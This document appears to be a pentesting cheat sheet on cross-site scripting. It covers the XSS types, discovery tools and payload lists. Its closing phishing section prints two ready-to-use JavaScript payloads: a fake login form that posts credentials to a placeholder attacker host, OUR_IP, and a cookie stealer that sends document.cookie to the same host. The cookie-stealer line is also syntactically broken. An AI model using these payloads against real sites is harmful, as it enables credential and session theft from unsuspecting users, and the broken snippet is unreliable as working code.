# Cross-Site Scripting (XSS)



### Types of XSS:

_**Stored (Persistent) XSS**_ - The most critical type of XSS, occurs when user input is stored on the back-end database then displayed upon retrieval.

_**Reflected (Non-Persistent) XSS**_ - Occurs when user input is displayed on the page after being processed by the back-end server, but without being stored.

_**DOM XSS**_ - Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side. Never reaching the back-end server.





### Automated Discovery:

There are common open-source tools that can assist in the discovery of XSS:

* **XSS Strike** - [https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)
* **Brute XSS** - [https://github.com/rajeshmajumdar/BruteXSS](https://github.com/rajeshmajumdar/BruteXSS)
* **XSSer** - [https://github.com/epsylon/xsser](https://github.com/epsylon/xsser)





### Manual Discovery:

The level of difficulty of finding XSS depends on the level of security of the web application. Below are some payloads to use for discovering XSS.

**PayloadAllTheThings** - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)

**PayloadBox** - [https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)







### Phishing / Credential Stealing:

A very common usecase for XSS is a phishing attack. Common forms of XSS phishing can include:

* Fake Login Form
* Session Hijacking



Fake Login Form:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Cookie Stealer:

```javascript
document.write(<img src="http://OUR_IP/?p="+document.cookie)></img>)
```
